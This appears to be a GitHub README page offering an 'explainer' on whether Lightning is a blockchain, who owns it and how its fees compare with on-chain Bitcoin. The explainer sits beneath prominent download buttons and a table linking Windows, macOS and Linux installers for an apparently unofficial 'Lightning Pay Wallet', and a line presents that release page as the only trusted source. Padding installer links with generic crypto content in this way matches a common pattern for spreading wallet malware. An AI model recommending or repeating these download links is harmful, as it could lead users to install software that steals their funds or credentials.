<p align="center"><img src="assets/banner-article.png" alt="Lightning Pay Wallet"></p>
# Is Lightning a blockchain, who owns it, and is it cheaper than Bitcoin
No, nobody, and usually yes, for different reasons than people assume.
<p align="center"><a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-windows-v1.2.1.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0350c2?style=for-the-badge&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD Windows"></a> <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-macos-v1.2.1.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0350c2?style=for-the-badge&logo=apple&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD macOS"></a> <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-linux-v1.2.1.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0350c2?style=for-the-badge&logo=linux&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD Linux"></a></p>
<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| ![Windows](https://img.shields.io/badge/platform-Windows-fed023?style=flat-square&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=ffffff&labelColor=091640) | Windows 10 (1909) or later, 64-bit | [lightning-pay-wallet-windows-v1.2.1.exe](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-windows-v1.2.1.exe) |
| ![macOS](https://img.shields.io/badge/platform-macOS-fed023?style=flat-square&logo=apple&logoColor=ffffff&labelColor=091640) | macOS 12 or later | [lightning-pay-wallet-macos-v1.2.1.dmg](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-macos-v1.2.1.dmg) |
| ![Linux](https://img.shields.io/badge/platform-Linux-fed023?style=flat-square&logo=linux&logoColor=ffffff&labelColor=091640) | x64, Ubuntu 20.04 or later, or equivalent | [lightning-pay-wallet-linux-v1.2.1.zip](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-linux-v1.2.1.zip) |

</div>
Every file above is published on [the Lightning Pay Wallet release page](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/tag/v1.2.1) under the same names, and that page is the only place the installers should come from.
> **Only download from this GitHub release page.**

Three short questions that get tangled together. Each has a short answer and a useful reason behind it.

## Is Lightning a blockchain?

No. Lightning is a network of channels layered above bitcoin's blockchain. It has no blocks of its own
and no separate mining. It uses the blockchain to open channels, close them and enforce the rules when
something goes wrong.

So the accuracy is: Lightning is a protocol built on a blockchain, not a blockchain itself.

## Who owns it?

Nobody. There is no company, foundation or token holder that controls it. The protocol is specified in
public documents, implemented by several independent teams, and run by whoever chooses to run a node.

A given wallet is owned by its maker, and that wallet can be shut down. The network it connects to
cannot be, which is why the distinction between a wallet and the network matters so much in every
custody question.

## Is it cheaper than Bitcoin?

Usually, for payments. A Lightning payment pays a routing fee to the nodes along the route, which is
typically a fraction of a satoshi. An on-chain transaction pays for block space, and block space gets
expensive when demand is high.

But the comparison is not pure. Opening a channel costs an on-chain fee, so the first payment on a new
channel carries that cost, and closing it costs again. For a handful of payments the on-chain route can
be cheaper; for many small payments Lightning wins easily.

## Is it free?

No, and "nearly free" is the honest phrasing. Routing fees exist, they are just small. Anyone claiming
zero cost is ignoring channel management.

## What the fees are not

They are not paid to the wallet. They go to the nodes that provide liquidity, and the on-chain part
goes to miners.

## Questions people ask

### Does Lightning have its own coin?

No. It moves bitcoin.

### Can one company switch it off?

No. A company can stop running its wallet or its nodes; it cannot stop the protocol.

### Why did my first payment cost more?

Because a channel had to be opened, and that opening is an on-chain transaction.
